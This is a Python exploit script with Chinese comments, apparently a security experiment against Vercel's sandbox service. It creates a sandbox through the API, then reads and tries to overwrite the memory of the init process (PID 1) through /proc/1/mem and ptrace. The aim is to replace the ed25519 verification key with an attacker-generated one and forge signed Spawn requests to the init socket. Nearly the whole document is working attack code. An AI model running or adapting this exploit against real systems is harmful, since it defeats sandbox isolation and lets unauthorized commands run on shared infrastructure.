# 实验J52: /proc/1/mem 公钥替换攻击 - 替换 sandbox-init 验证公钥
# 目标: 找到内存中 ed25519 公钥, 换成我们的, 用私钥签名通过 init.sock 验证
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj52"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, base64, subprocess, json, time, struct, ctypes

PUB = base64.b64decode("zBO7hUsIkDOrMW4VmKei/v0KlhZflnTw7RAYFeoT5uw=")
print("pub len:", len(PUB), flush=True)

print("===== [1] 生成我们自己的 ed25519 密钥 =====", flush=True)
os.makedirs("/tmp/k", exist_ok=True)
os.chdir("/tmp/k")
subprocess.run(["openssl", "genpkey", "-algorithm", "ed25519", "-out", "key.pem"], capture_output=True)
subprocess.run(["openssl", "pkey", "-in", "key.pem", "-pubout", "-out", "pub.pem"], capture_output=True)
MYPUB = subprocess.run(["openssl", "pkey", "-pubin", "-in", "pub.pem", "-outform", "DER"],
                       capture_output=True).stdout
# DER 里 PKCS8: 30 2a 30 05 06 03 2b 65 70 03 21 00 <32字节>
i = MYPUB.rfind(b"\x03\x21\x00")
MYPUB32 = MYPUB[i+3:i+35]
print("my pub:", base64.b64encode(MYPUB32).decode(), flush=True)
print("differs from host pub:", MYPUB32 != PUB, flush=True)

def sign(msg: bytes):
    with open("/tmp/k/msg.bin", "wb") as f:
        f.write(msg)
    r = subprocess.run(["openssl", "pkeyutl", "-sign", "-inkey", "/tmp/k/key.pem",
                        "-rawin", "-in", "/tmp/k/msg.bin", "-out", "/tmp/k/sig.bin"],
                       capture_output=True)
    if r.returncode != 0:
        return None, r.stderr.decode()[:200]
    return open("/tmp/k/sig.bin", "rb").read(), None

print("===== [2] 扫描内存找 pubkey 32字节 =====", flush=True)
fd = os.open("/proc/1/mem", os.O_RDONLY)
maps = open("/proc/1/maps").read()
hits = []
for line in maps.splitlines():
    p = line.split()
    if len(p) < 2 or "r" not in p[1]:
        continue
    if "w" not in p[1]:
        continue
    addr = p[0].split("-")
    start, end = int(addr[0], 16), int(addr[1], 16)
    if end - start > 64 * 1024 * 1024:
        continue
    try:
        os.lseek(fd, start, os.SEEK_SET)
        data = os.read(fd, end - start)
    except Exception:
        continue
    idx = 0
    while True:
        i = data.find(PUB, idx)
        if i < 0:
            break
        hits.append((start + i, p[5] if len(p) > 5 else ""))
        idx = i + 1
os.close(fd)
print("pubkey hits:", [(hex(a), pa) for a, pa in hits], flush=True)

print("===== [3] 可写性测试 =====", flush=True)
if hits:
    addr = hits[0][0]
    # 尝试 /proc/1/mem 直接写 (写回原值, 测试权限)
    try:
        fd = os.open("/proc/1/mem", os.O_RDWR)
        os.lseek(fd, addr, os.SEEK_SET)
        n = os.write(fd, PUB)
        os.close(fd)
        print("mem write OK, wrote %d bytes" % n, flush=True)
        wmode = "proc-mem"
    except Exception as e:
        print("proc-mem write failed: %r" % e, flush=True)
        wmode = None
    # ptrace POKEDATA 测试
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        libc.ptrace(16, 1, None, None)  # ATTACH
        libc.waitpid(1, None, 0)
        PTRACE_POKEDATA = 5
        ok = 0
        for off in range(0, 32, 8):
            word = int.from_bytes(PUB[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)  # DETACH
        print("ptrace POKEDATA ok: %d/4 words" % ok, flush=True)
        if ok == 4:
            wmode = "ptrace"
    except Exception as e:
        print("ptrace write failed: %r" % e, flush=True)
    print("write mode:", wmode, flush=True)
else:
    print("NO PUBKEY HITS IN WRITABLE SEGMENTS", flush=True)

print("===== [4] 签名格式探测 (不替换, 看错误差异) =====", flush=True)
def ccall(path, body, hdrs, timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: application/connect+json",
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", json.dumps(body), "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
body = {"command": "id"}
body_j = json.dumps(body)
# 我们自己的签名 (host pubkey 不会验证通过, 但能看错误是否不同)
s1, e1 = sign(ts.encode())
s2, e2 = sign(ts.encode() + body_j.encode())
s3, e3 = sign(body_j.encode() + ts.encode())
s4, e4 = sign((ts + "\n" + body_j).encode())
import base64 as b64
for label, sig in [("ts", s1), ("ts+body", s2), ("body+ts", s3), ("ts\\n+body", s4)]:
    if sig is None:
        print(label, "sign err", e1 or e2 or e3 or e4, flush=True)
        continue
    out = ccall("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body,
                {"x-timestamp": ts, "x-signature": b64.b64encode(sig).decode()})
    m = re.search(r'(\{"error".*?\})', out)
    print("%-10s -> %s" % (label, m.group(1) if m else out[-200:]), flush=True)
'''
run_cmd(sid, SCAN, "mem-pubkey-replace", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
